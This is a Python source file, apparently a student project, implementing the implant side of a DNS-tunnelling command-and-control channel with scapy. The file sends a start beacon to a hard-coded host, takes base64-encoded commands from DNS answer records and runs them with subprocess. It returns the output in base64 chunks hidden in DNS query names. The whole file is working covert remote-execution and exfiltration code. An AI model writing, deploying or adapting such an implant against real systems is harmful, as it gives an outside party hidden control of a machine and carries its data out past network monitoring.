
####    Import Librairies
from scapy.all import *
import subprocess
import time
import base64

Portlistener=10000
taille_MAX=16
### lambda, filter only for dns master pkt

def choose_trafic(pkt):
	if(IP in pkt):
		return (pkt['IP'].src == "192.168.1.60")
	else:
		return False

###sniff incomming traffic on port 53

def listen_to_trafic(port,IP,count):
	pkts=sniff(lfilter=choose_trafic,count=count)
	return pkts


### Exec command , and store the return value of the command 

def exec_command(cmd,arg):
	process = subprocess.Popen([cmd,arg],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr=process.communicate()
	return stdout.decode('utf-8')

def decode_b64(message):
	query_b64_bytes=base64.b64decode(message)
	return query_b64_bytes.decode('ascii')
	

def encode_b64(message):
	query_bytes=message.encode('ascii')
	query_b64_bytes=base64.b64encode(query_bytes)
	return query_b64_bytes.decode('ascii')

def add_domain_padding():
	return ".telecomparis.fr"

def reverse_domain_padding(message):
	print(message)
	return message.split(b'.')[0]

###Listen to DNS paquet, waiting for order
def listen_to_order():
	while (True):
		paquet=listen_to_trafic(Portlistener,"192.168.1.60",1)
		for pkt in paquet:
			if(UDP in pkt):
				if pkt.haslayer(DNS):
					if(DNSRR in pkt):
						query=pkt['DNSRR'].rrname

						query=reverse_domain_padding(query)
						print(query)
						#query.decode('utf-8')
						### remove the '.' at the end
						query1=query.split(b'&')[0]
						query2=query.split(b'&')[1]
		return (decode_b64(query1),decode_b64(query2))
		break;




def send_return_cmd(data):
	chunks = [data[i:i+taille_MAX] for i in range(0, len(data), taille_MAX)]
	for message in chunks:
			i=0
			cast_data=data
			print(message)

			time.sleep(0.5) #otherwise, sniff() on server side can't process paquet, to fast
			send(IP(dst="192.168.1.60")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64(message)+add_domain_padding())),verbose=0)
	print(chunks)


if __name__ == "__main__":
	# send to server that he can start sending cmd
	sr1(IP(dst="192.168.1.60")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64("start")+add_domain_padding())),verbose=0)
	(cmd,arg)=listen_to_order()
	print(cmd,arg)
	command_return=exec_command(cmd,arg)
	print(command_return)
	print(len(command_return))
	send_return_cmd(command_return)
	##send_return_cmd(command_return)
	time.sleep(0.5)
	#send to server, finish sending data from specific cmd
	sr1(IP(dst="192.168.1.60")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64("stop")+add_domain_padding())),verbose=0)
	#answer = sr1(IP(dst="192.168.1.97")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.thepacketgeek.com")),verbose=0)

